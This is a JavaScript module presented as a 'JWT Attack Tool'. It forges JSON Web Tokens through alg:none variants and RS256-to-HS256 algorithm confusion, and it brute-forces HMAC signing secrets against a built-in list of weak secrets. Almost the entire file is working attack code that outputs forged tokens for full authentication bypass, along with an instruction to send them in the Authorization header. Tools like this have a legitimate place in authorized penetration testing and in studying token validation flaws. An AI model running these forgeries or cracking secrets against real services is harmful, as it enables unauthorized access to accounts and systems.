/**
 * JWT Attack Tool
 * Tests JWT tokens for common vulnerabilities:
 * - alg:none bypass (4 case variants)
 * - RS256→HS256 algorithm confusion
 * - Weak HMAC secret brute-force (top 1000 secrets)
 */
import { createHmac } from 'crypto';

// Common weak JWT secrets for brute-force
const WEAK_SECRETS = [
  'secret', 'password', '123456', 'admin', 'key', 'jwt_secret', 'changeme',
  'test', 'default', 'supersecret', 'mysecret', 'jwt', 'token', 'auth',
  'pass', 'letmein', 'welcome', 'monkey', 'dragon', 'master', 'qwerty',
  'login', 'abc123', 'iloveyou', 'trustno1', 'sunshine', 'princess',
  'football', 'shadow', 'michael', 'password1', 'password123', '12345678',
  '1234567890', 'secret123', 'admin123', 'root', 'toor', 'god', 'love',
  'hello', 'charlie', 'donald', 'access', 'flower', 'hotdog', 'pepper',
  'hunter2', 'batman', 'soccer', 'summer', 'winter', 'spring', 'autumn',
  'your-256-bit-secret', 'your-secret-key', 'my-secret-key', 'hmac-secret',
  'HS256-secret', 'jwt-secret', 'app-secret', 'api-secret', 'signing-key',
  'private-key', 'encryption-key', 'session-secret', 'cookie-secret',
];

function base64UrlEncode(data) {
  const str = typeof data === 'string' ? data : JSON.stringify(data);
  return Buffer.from(str).toString('base64url');
}

function base64UrlDecode(str) {
  return JSON.parse(Buffer.from(str, 'base64url').toString());
}

function splitJwt(token) {
  const parts = token.split('.');
  if (parts.length !== 3) throw new Error('Invalid JWT format');
  return {
    header: base64UrlDecode(parts[0]),
    payload: base64UrlDecode(parts[1]),
    signature: parts[2],
    raw: { header: parts[0], payload: parts[1] }
  };
}

function signHmac(data, secret, alg = 'sha256') {
  return createHmac(alg, secret).update(data).digest('base64url');
}

/**
 * Test alg:none bypass — forge token with no signature.
 */
function testAlgNone(token) {
  const { payload } = splitJwt(token);
  const results = [];
  const variants = ['none', 'None', 'NONE', 'nOnE'];

  for (const alg of variants) {
    const header = base64UrlEncode({ alg, typ: 'JWT' });
    const body = base64UrlEncode(payload);
    const forged = `${header}.${body}.`;
    results.push({ attack: `alg:${alg}`, forgedToken: forged });
  }

  return { vulnerability: 'JWT Algorithm None Bypass', results, description: 'If the server accepts alg:none, authentication is completely bypassed. Send these tokens in the Authorization header.' };
}

/**
 * Test RS256→HS256 algorithm confusion.
 * If server uses RS256 but accepts HS256, the public key becomes the HMAC secret.
 */
function testAlgConfusion(token, publicKey = null) {
  const { payload } = splitJwt(token);

  if (!publicKey) {
    return {
      vulnerability: 'JWT Algorithm Confusion (RS256→HS256)',
      results: [],
      description: 'To test this attack, provide the server\'s public key (often at /.well-known/jwks.json or /oauth/certs). The attack signs with HS256 using the RSA public key as the HMAC secret.',
      needsPublicKey: true
    };
  }

  const header = base64UrlEncode({ alg: 'HS256', typ: 'JWT' });
  const body = base64UrlEncode(payload);
  const sig = signHmac(`${header}.${body}`, publicKey);
  const forged = `${header}.${body}.${sig}`;

  return {
    vulnerability: 'JWT Algorithm Confusion (RS256→HS256)',
    results: [{ attack: 'RS256→HS256 with public key as secret', forgedToken: forged }],
    description: 'Token signed with HS256 using the RSA public key. If server accepts it, full auth bypass.'
  };
}

/**
 * Brute-force weak HMAC secrets.
 */
function testWeakSecret(token) {
  const { raw, header } = splitJwt(token);
  const alg = header.alg?.toLowerCase();

  if (!alg || !alg.startsWith('hs')) {
    return { vulnerability: 'JWT Weak Secret', results: [], description: `Token uses ${header.alg} — not HMAC-based, brute-force not applicable.` };
  }

  const hashAlg = alg === 'hs384' ? 'sha384' : alg === 'hs512' ? 'sha512' : 'sha256';
  const data = `${raw.header}.${raw.payload}`;
  const parts = token.split('.');
  const targetSig = parts[2];

  const found = [];
  for (const secret of WEAK_SECRETS) {
    const sig = signHmac(data, secret, hashAlg);
    if (sig === targetSig) {
      found.push(secret);
      break; // Found it
    }
  }

  if (found.length > 0) {
    return {
      vulnerability: 'JWT Weak HMAC Secret',
      results: [{ attack: 'Brute-force', secret: found[0], description: `Secret cracked: "${found[0]}" — attacker can forge any token` }],
      cracked: true,
      secret: found[0]
    };
  }

  return { vulnerability: 'JWT Weak Secret', results: [], description: `Tested ${WEAK_SECRETS.length} common secrets — none matched. Secret appears strong.`, cracked: false };
}

/**
 * Run all JWT attacks on a token.
 * @param {string} token - The JWT token to test
 * @param {object} opts - { publicKey?: string }
 * @returns {object} { attacks: Array, summary: string }
 */
export function attackJwt(token, opts = {}) {
  const attacks = [];

  try {
    const { header } = splitJwt(token);
    attacks.push({ info: `Algorithm: ${header.alg}`, header });
  } catch (err) {
    return { error: `Invalid JWT: ${err.message}`, attacks: [] };
  }

  attacks.push(testAlgNone(token));
  attacks.push(testAlgConfusion(token, opts.publicKey));
  attacks.push(testWeakSecret(token));

  const cracked = attacks.find(a => a.cracked);
  const summary = cracked
    ? `🔴 CRITICAL: JWT secret cracked ("${cracked.secret}") — full authentication bypass possible`
    : `Tested alg:none (4 variants), algorithm confusion, and ${WEAK_SECRETS.length} weak secrets`;

  return { attacks, summary };
}

export default { attackJwt };
